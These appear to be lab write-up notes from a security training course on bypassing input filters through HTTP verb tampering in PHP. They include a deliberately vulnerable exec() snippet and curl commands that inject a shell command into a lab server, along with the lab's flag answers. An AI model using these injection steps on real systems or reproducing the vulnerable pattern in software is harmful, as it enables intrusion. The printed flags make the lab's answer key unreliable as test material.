# Section 4 — Bypassing Security Filters via Verb Tampering

---

## The Pattern

The application checks user input from ONE source (e.g., `$_GET`) but USES the value from a wider source (`$_REQUEST` covers GET + POST + COOKIE) — or vice versa.

```php
// Filter inspects only $_GET
$pattern = "/^[A-Za-z\s]+$/";
if (preg_match($pattern, $_GET["filename"])) {   // ← only checks GET
    // ... but the action uses $_REQUEST which covers GET + POST + COOKIE
    exec("touch /uploads/" . $_REQUEST["filename"]);
}
```

When you switch the HTTP method to POST:
- `$_GET["filename"]` is empty → filter sees empty string, passes (or treats as no input)
- `$_REQUEST["filename"]` picks up the POST value → injection runs

The mismatch is the bug. The fix is to validate from the SAME source the action uses.

---

## Detection

Send an obviously malicious input (e.g., `test;`) via the normal verb:
- If blocked (`Malicious Request Denied!`) → filter is in place
- Now resend with a DIFFERENT verb (or move param from URL to body)
- If now accepted → filter is method-specific = bypass found

---

## Common Mismatch Patterns

| Filter source | Action sink | Bypass verb |
|---------------|-------------|-------------|
| `$_GET` | `$_REQUEST` / `$_POST` | Send as POST |
| `$_POST` | `$_REQUEST` / `$_GET` | Send as GET |
| URL parameters | `req.body.*` | Move param to body, use POST |
| Form body | `req.query.*` | Move param to URL, use GET |
| Header check on Content-Type | Body parsed regardless | Change Content-Type |

---

## Burp Workflow

1. Intercept the original request (GET)
2. Submit a payload → see `Malicious Request Denied!`
3. Right-click intercepted request → **Change Request Method** (GET ↔ POST)
4. The body now contains the params; URL is bare
5. Forward → check if filter still blocked it
6. If accepted → filter was source-specific, bypass confirmed
7. Now send the actual injection payload via the bypassed verb

---

## Lab — Command Injection via Verb Tampering

**Target:** `154.57.164.66:30765`

The File Manager form's `filename` field is filtered on GET (rejects special chars like `;`). The filter doesn't run on POST, but the back-end `exec()` uses `$_REQUEST` so POST values flow through.

### Step 1 — Confirm filter on normal method (GET)
```bash
curl -sk -G "http://154.57.164.66:30765/" --data-urlencode "filename=test;" | grep -iE 'denied|malicious'
# "Malicious Request Denied!"
```

### Step 2 — Send same payload via POST (bypasses filter)
```bash
curl -sk -X POST "http://154.57.164.66:30765/index.php" \
  --data-urlencode "filename=file; cp /flag.txt ./"
```

The injected `cp /flag.txt ./` copies the flag from `/` to the current directory (web-accessible).

### Step 3 — Read the copied flag
```bash
# /flag.txt is now web-accessible after the cp injection
curl -sk "http://154.57.164.66:30765/flag.txt"
# → HTB{b3_v3rb_c0n51573n7}
```

**Flag:** `HTB{b3_v3rb_c0n51573n7}`

> **Gotcha:** the page's inline header displays `HTB{4lw4y5_c0v3r_4ll_v3rb5}` (Section 3's flag baked into the template). The Section 4 answer is the content of the newly-copied `/flag.txt` file — fetch it directly via the URL.

---

## Why This Is Different From "Plain" Command Injection

The Command Injections module (Section 8) covered filter bypass via character/word obfuscation (`c'a't`, `${IFS}`). That's the workaround when the filter is well-implemented but only catches specific strings.

Verb Tampering bypasses the filter ENTIRELY — the filter never even runs because the application picked the wrong source. No payload obfuscation needed.

---

## Exam Notes

- The `$_GET` filter + `$_REQUEST` sink mismatch is the **canonical** PHP example — explicitly tested in the module
- Switching from GET to POST (or vice versa) is the trivial bypass — most automated scanners miss this because they don't try both
- Other framework parallels:
  - Express: `req.query` (URL) vs `req.body` (POST body)
  - Django: `request.GET` vs `request.POST` vs `request.data`
  - Spring: `@RequestParam` (defaults to either) vs explicit `@RequestParam(value=..., required=true)`
- The fix is consistent input sourcing — pull from the SAME source you validate. Or validate from `$_REQUEST` since that's what the action uses.
- Once the filter is bypassed, the underlying vulnerability (SQLi, command injection, XSS) is fully exploitable with the standard payloads
